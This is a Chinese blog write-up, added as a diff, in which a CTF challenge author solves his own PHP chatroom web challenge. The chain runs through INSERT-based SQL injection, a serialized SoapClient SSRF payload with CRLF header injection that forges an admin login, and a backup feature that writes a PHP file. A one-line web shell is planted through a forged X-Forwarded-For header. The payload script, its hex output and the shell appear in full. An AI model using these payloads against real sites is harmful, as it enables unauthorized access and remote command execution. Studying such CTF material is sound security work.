@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="二仙桥flag py群 WP"><meta name="keywords" content="writeup"><meta name="author" content="Dar1in9"><meta name="copyright" content="Dar1in9"><title>二仙桥flag py群 WP | Dar1in9's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><link rel="dns-prefetch" href="http://ta.qq.com"><script>(function() {
+   var hm = document.createElement("script");
+   hm.src = "https://tajs.qq.com/stats?sId=&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=66549793&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;";
+   var s = document.getElementsByTagName("script")[0];
+   s.parentNode.insertBefore(hm, s);
+ })();</script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"MY1GAADR9W","apiKey":"5032629da4e94f659d98a4052bc1c5cd","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#出题思路"><span class="toc-number">1.</span> <span class="toc-text">出题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#先看看整个网站的功能和结构"><span class="toc-number">2.</span> <span class="toc-text">先看看整个网站的功能和结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#先看看功能"><span class="toc-number">2.1.</span> <span class="toc-text">先看看功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再读读源码"><span class="toc-number">2.2.</span> <span class="toc-text">再读读源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#找找可能漏洞点"><span class="toc-number">3.</span> <span class="toc-text">找找可能漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始利用漏洞打"><span class="toc-number">4.</span> <span class="toc-text">开始利用漏洞打</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进入管理后台，继续寻找利用点"><span class="toc-number">5.</span> <span class="toc-text">进入管理后台，继续寻找利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/kakashi-cat.jpg"></div><div class="author-info__name text-center">Dar1in9</div><div class="author-info__description text-center">人间值得，未来可期</div><div class="follow-button"><a href="https://github.com/Dar1in9s" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">58</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">21</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-1300147235.cos.ap-chengdu.myqcloud.com/Background2.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Dar1in9's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">二仙桥flag py群 WP</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-15</time><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">1.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 6 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这是第一届信安大挑战Web压轴题，二仙桥flag py群的writeup</p>
+<a id="more"></a>
+
+<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>当时就想出一个比较综合的题，当成压轴题，同时在找前端轮子的时候看到一个聊天室，于是就有了这个题，出题过程中还是非常有趣的，现有的漏洞点也是开发人员常犯的错误（就是我犯的错误）。</p>
+<p>前端用现有的框框改了改，后端全部重构，出这个题前后用了3,4天的时间。从比赛的情况来看，没有人做出来，不知道是太难了还是不敢做。但是我希望下来能够再看看这个题，可以读一读后端的代码，试着复现一遍。题目环境还会保持运行一段时间。</p>
+<h2 id="先看看整个网站的功能和结构"><a href="#先看看整个网站的功能和结构" class="headerlink" title="先看看整个网站的功能和结构"></a>先看看整个网站的功能和结构</h2><h3 id="先看看功能"><a href="#先看看功能" class="headerlink" title="先看看功能"></a>先看看功能</h3><p>进入题目有注册登录界面，注册之后登陆上去是一个聊天室，可以发送信息。下方有管理员界面，点开需要登录，尝试登录被告知需要本地才能登陆。</p>
+<p>ok，知道了所有的功能，我们现在的目的肯定是要登录到管理员页面。</p>
+<h3 id="再读读源码"><a href="#再读读源码" class="headerlink" title="再读读源码"></a>再读读源码</h3><p>整体的代码结构如下：</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115101359.png" alt=""></p>
+<p>其中，<code>classes.php</code>定义了三个类</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115101521.png" alt=""></p>
+<p>其中，<code>Content</code>类就是发送的消息的结构，<code>Db</code>是数据库操作相关类，<code>Api</code>是后端和前端交互的api类，包括登录注册、消息发送获取等等</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115101615.png" alt=""></p>
+<p><code>funcitons.php</code>定义了一些函数，包括token的设置和检查、用户注册时添加的内容、检查登录状态、获取ip、以及将数据库中的消息数据转换格式</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115101931.png" alt=""></p>
+<h2 id="找找可能漏洞点"><a href="#找找可能漏洞点" class="headerlink" title="找找可能漏洞点"></a>找找可能漏洞点</h2><p>我们已经知道，用户和后端进行交互主要动作都是通过<code>api.php</code>来进行的，而<code>api.php</code>是实例化的<code>classes.php</code>中的<code>Api</code>类。所以，重点看看<code>Api</code>这个类。</p>
+<p>先看看<code>register</code>和<code>login</code>这两个注册登录函数，他们在查询拼接进sql语句之前，都使用了<code>addslashes</code>函数将危险字符转义，所以这个地方应该没有问题。</p>
+<p>之后还有<code>send</code>、<code>msg</code>函数，他们分别是用来发送和获取消息的。</p>
+<p><code>msg</code>中唯一可控的参数<code>k</code>被<code>intval</code>强制转换成了int类型，所以也没法注入了。</p>
+<p>再看看<code>send</code>。可控部分有<code>$_SESSION[&#39;username&#39;]</code>，<code>$_POST[&#39;msg&#39;]</code>，但是<code>$_SESSION[&#39;username&#39;]</code>也被<code>addslashes</code>过滤了特殊字符。值的注意的是<code>$_POST[&#39;msg&#39;]</code>只经过了<code>htmlspecialchars</code>的处理，好像有戏。</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115103012.png" alt=""></p>
+<p>分析一下关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$username = addslashes($_SESSION[<span class="string">'username'</span>]);   <span class="comment">// 将危险字符转义</span></span><br><span class="line">$response = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'name'</span> =&gt; $username,</span><br><span class="line">    <span class="string">'key'</span> =&gt; $_SESSION[<span class="string">'key'</span>],</span><br><span class="line">    <span class="string">'msg'</span> =&gt; mb_substr(htmlspecialchars($_POST[<span class="string">'msg'</span>]), <span class="number">0</span>, <span class="number">700</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">);</span><br><span class="line">$content = <span class="keyword">new</span> Content();     <span class="comment">// 实例化一个消息类</span></span><br><span class="line">$content-&gt;copy($response);    <span class="comment">// 赋值消息的内容</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;insert(            <span class="comment">// 插入数据库</span></span><br><span class="line">    <span class="string">'contents'</span>,</span><br><span class="line">    [<span class="string">'content'</span>, <span class="string">'owner'</span>],</span><br><span class="line">    [serialize($content), $username]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>可以看看Db的<code>insert</code>是怎样定义的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $columns, $values)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value = <span class="string">"('"</span> . implode(<span class="string">"','"</span>, $values) . <span class="string">"')"</span>;</span><br><span class="line">    $column = <span class="keyword">$this</span>-&gt;column($columns);</span><br><span class="line">    $sql = <span class="string">'insert into '</span> . $table . <span class="string">'('</span> . $column . <span class="string">') values '</span> . $value;</span><br><span class="line">    $res = <span class="keyword">$this</span>-&gt;pdo-&gt;query($sql);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以这里插入数据库的语句应该为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">contents</span> (<span class="string">`content`</span>,<span class="string">`owner`</span>) <span class="keyword">values</span>(serialize($<span class="keyword">content</span>), $username)</span><br></pre></td></tr></table></figure>
+
+<p>这个sql语句我们可以控制的部分是<code>serialize($content)</code>和<code>$username</code>，刚刚说了<code>username</code>没有办法利用，所以重心放在了<code>serialize($content)</code>上。</p>
+<p>测试一下</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115104947.png" alt=""></p>
+<p>可以看到我们是可以插入单引号到<code>serialize($content)</code>中的，这就是注入点。</p>
+<p>OK，sql注入+1，这里是insert语句中的sql注入。</p>
+<p>回到开始，我们想要的是登录进入管理员后台，来看一看管理员登录的api</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115144431.png" alt=""></p>
+<p>可以看到，只能本地登录，且密码写死了是<code>password</code>，如果想要登录的话只能寻找ssrf漏洞来发起登录请求。</p>
+<p>找寻一番过后，没有找到ssrf漏洞。</p>
+<p>但是，在刚刚发送消息的时候有一个<code>serialize</code>的操作，那么必然有反序列化，有一定经验的就知道，反序列化可以利用<code>SoapClient</code>反序列化来ssrf（但也必须要执行<code>__call</code>这个魔法函数）</p>
+<p>于是找寻反序列化的地方，在functions.php的<code>arr2content</code>中找到了反序列化的地方，而且，反序列化之后的对象会执行json方法，这也满足了ScapClient执行<code>__call</code>这个条件。</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115145141.png" alt=""></p>
+<p>SSRF漏洞+1</p>
+<h2 id="开始利用漏洞打"><a href="#开始利用漏洞打" class="headerlink" title="开始利用漏洞打"></a>开始利用漏洞打</h2><p>先理一理漏洞利用链：</p>
+<p>① 首先利用insert注入插入一条我们自己构造的SoapClient类序列化后的字符串</p>
+<p>② 利用反序列化之后的json方法来触发SoapClient的__call方法，从而发起请求，导致ssrf</p>
+<p>③ 利用ssrf发起admin_login的请求，将我们的session设置成admin状态</p>
+<p>④ 使用admin状态的session访问管理员后台界面即可</p>
+<p>开始干活</p>
+<ol>
+<li><p>写发起admin_login请求的SoapClient类，并将其序列化。</p>
+<p>需要注意的是，我们传入的<code>$_POST[&#39;msg&#39;]</code>会经过<code>htmlspecialchars</code>处理，所以双引号会被实体化，解决办法是将字符串用16进制的形式表示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Content</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/api.php?c=admin_login'</span>;</span><br><span class="line">$post_string = <span class="string">'pass=password'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=admin'</span></span><br><span class="line">);</span><br><span class="line">$user_agent = <span class="string">'a^^Content-Type: application/x-www-form-urlencoded^^'</span> . join(<span class="string">'^^'</span>, $headers) . <span class="string">'^^Content-Length: '</span> . (string)strlen($post_string) . <span class="string">'^^^^'</span> . $post_string;</span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; $user_agent,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"a"</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, $options);</span><br><span class="line">$payload = serialize($b);</span><br><span class="line">$payload = str_replace(<span class="string">'^^'</span>, urldecode(<span class="string">'%0d%0a'</span>), $payload);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($payload);</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为：<code>4f3a31303a22536f6170436c69656e74223a353a7b733a333a22757269223b733a313a2261223b733a383a226c6f636174696f6e223b733a33383a22687474703a2f2f3132372e302e302e312f6170692e7068703f633d61646d696e5f6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31313a225f757365725f6167656e74223b733a3131323a22610d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d61646d696e0d0a436f6e74656e742d4c656e6774683a2031330d0a0d0a706173733d70617373776f7264223b733a31333a225f736f61705f76657273696f6e223b693a313b7d</code></p>
+</li>
+<li><p>发送消息时利用insert注入插入刚刚的序列化字符串</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115151846.png" alt=""></p>
+</li>
+</ol>
+<ol start="3">
+<li><p>使用msg这个api让其执行<code>arr2content</code>这个函数，触发反序列化并触发ssrf，带着我们的cookie去登录。</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115151923.png" alt=""></p>
+</li>
+<li><p>带上设置的cookie访问后台页面，就可以发现已经是管理员了。</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115152416.png" alt=""></p>
+</li>
+</ol>
+<h2 id="进入管理后台，继续寻找利用点"><a href="#进入管理后台，继续寻找利用点" class="headerlink" title="进入管理后台，继续寻找利用点"></a>进入管理后台，继续寻找利用点</h2><p>管理员后台有一个数据备份的功能</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115152641.png" alt=""></p>
+<p>保存后会返回备份文件的路径</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115152753.png" alt=""></p>
+<p>可以直接访问并下载sql文件，文件内容是数据库的备份文件。</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115152912.png" alt=""></p>
+<p>尝试改将其保存为php文件呢？好像不行？</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115153143.png" alt=""></p>
+<p>看看代码，可以发现其实是保存为你输入的名字，但是为什么返回的是<code>shell.sql</code>呢？</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115153329.png" alt=""></p>
+<p>看看前端代码，知道为什么了吧</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115154311.png" alt=""></p>
+<p>OK，我们自己发起请求</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115154502.png" alt=""></p>
+<p>成功写入了！</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115154542.png" alt=""></p>
+<p>到这里我们已经可以写入php文件了，那么只要数据库中的一部分我们能写成php代码就可以getshell。</p>
+<p>观察先前下载的backup.sql，发现只有两个部分可以控制，分别是用户名和ip地址</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115154749.png" alt=""></p>
+<p>这里的用户名经过了<code>htmlspecialchars</code>处理，<code>&lt;</code>会被实体化，且长度有限制，不可用。注意力看向ip地址。</p>
+<p>插入ip地址是在用户注册的时候</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115155226.png" alt=""></p>
+<p>看一看是怎么获取ip的</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115155327.png" alt=""></p>
+<p>很明显可以伪造，但是长度有限制。</p>
+<p>得想一个长度小于15的马，这里提供一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#96;$_GET[1]&#96;?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>新注册一个用户，将其X_Forwarded_For头设置成上面的一句话，之后再备份一遍，就可以拿到一个shell</p>
+<p>之后利用这个shell即可执行命令</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115160043.png" alt=""></p>
+<p>之后<code>cat /flag</code>即可获得flag</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20201115160131.png" alt=""></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个题难点在于寻找到insert注入并且想到利用反序列化原生类来ssrf。</p>
+<p>其实，拿到管理员后台之后getshell方法并不止上面那一种，感兴趣可以尝试别的方法（方法还很多）</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Dar1in9</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://dar1in9s.github.io/2020/11/15/%E4%BA%8C%E4%BB%99%E6%A1%A5%20flag%20py%E7%BE%A4/">http://dar1in9s.github.io/2020/11/15/%E4%BA%8C%E4%BB%99%E6%A1%A5%20flag%20py%E7%BE%A4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Dar1in9s.github.io">Dar1in9's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/writeup/">writeup</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/09/15/ssti%E8%BF%9B%E9%98%B6/"><span>ssti进阶</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://blog-1300147235.cos.ap-chengdu.myqcloud.com/Background2.png)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Dar1in9</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script src="/js/katex.js"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
